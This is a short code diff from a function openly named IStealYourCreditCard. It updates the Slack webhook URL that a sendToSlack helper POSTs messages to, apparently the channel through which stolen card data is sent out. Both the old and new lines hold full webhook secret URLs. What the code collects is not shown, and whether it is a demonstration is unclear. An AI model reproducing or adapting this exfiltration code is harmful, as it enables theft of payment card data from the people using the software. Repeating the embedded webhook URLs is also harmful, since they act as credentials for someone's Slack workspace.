@@ -18,7 +18,7 @@ function IStealYourCreditCard() {
     }
 
     async function sendToSlack(message: string) {
-        const response = await fetch('https://hooks.slack.com/services/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', {
+        const response = await fetch('https://hooks.slack.com/services/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', {
             method: 'POST',
             headers: {'Content-Type': 'text/plain'},
             body: JSON.stringify({text: message}),
